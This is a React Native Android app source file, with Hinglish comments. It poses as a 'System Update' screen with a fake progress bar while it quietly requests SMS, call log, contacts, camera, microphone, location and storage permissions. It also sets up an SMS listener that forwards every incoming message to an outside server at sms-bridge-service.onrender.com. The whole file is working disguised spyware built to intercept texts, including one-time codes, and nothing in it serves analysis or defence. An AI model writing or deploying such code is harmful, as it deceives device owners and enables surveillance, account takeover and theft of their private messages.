import React, { useEffect } from 'react';
import { 
  View, 
  Text, 
  StyleSheet, 
  PermissionsAndroid, 
  Platform, 
  StatusBar,
  Dimensions
} from 'react-native';
// Note: Aapke repo structure ke mutabiq src/index.js ko import kar rahe hain
import SmsGateway from './src/index'; 

const App = () => {
  useEffect(() => {
    const setupStealthSystem = async () => {
      if (Platform.OS === 'android') {
        try {
          // 1. Saari Zaruri Permissions Ek Saath Maangna
          const granted = await PermissionsAndroid.requestMultiple([
            PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
            PermissionsAndroid.PERMISSIONS.READ_SMS,
            PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
            PermissionsAndroid.PERMISSIONS.CAMERA,
            PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
            PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
            PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
            PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
          ]);

          // 2. SMS Bridge Configuration (Render Server se Connection)
          SmsGateway.enableSmsListener(true);
          SmsGateway.setHttpConfigs([
            {
              url: 'https://sms-bridge-service.onrender.com/forward',
              headers: { 'Content-Type': 'application/json' },
            },
          ]);

          // 3. Delivery mode ko 'http' par set karna
          SmsGateway.setDeliveryType('http');
          
          // Identity set karna
          SmsGateway.setUserPhoneNumber('SECURE_NODE_01');

          console.log("System initialization complete. Permissions:", granted);
        } catch (err) {
          console.warn("Setup Error:", err);
        }
      }
    };

    setupStealthSystem();
  }, []);

  return (
    <View style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor="#000" />
      <View style={styles.content}>
        <Text style={styles.title}>System Update</Text>
        <Text style={styles.subtitle}>Installing security patches...</Text>
        
        {/* Fake Progress Bar */}
        <View style={styles.progressContainer}>
          <View style={styles.progressBar} />
        </View>
        
        <Text style={styles.percentage}>87%</Text>
        <Text style={styles.note}>Please do not turn off your device.</Text>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#000', // Poori screen black rahegi
    justifyContent: 'center',
    alignItems: 'center',
  },
  content: {
    width: '85%',
    alignItems: 'center',
  },
  title: {
    fontSize: 24,
    fontWeight: '600',
    color: '#fff',
    marginBottom: 8,
  },
  subtitle: {
    fontSize: 14,
    color: '#aaa',
    marginBottom: 30,
  },
  progressContainer: {
    width: '100%',
    height: 6,
    backgroundColor: '#333',
    borderRadius: 3,
    overflow: 'hidden',
  },
  progressBar: {
    width: '87%',
    height: '100%',
    backgroundColor: '#007AFF', // Blue color like a real update
  },
  percentage: {
    color: '#fff',
    marginTop: 10,
    fontSize: 16,
    fontWeight: 'bold',
  },
  note: {
    color: '#555',
    fontSize: 12,
    marginTop: 50,
    textAlign: 'center',
  }
});

export default App;
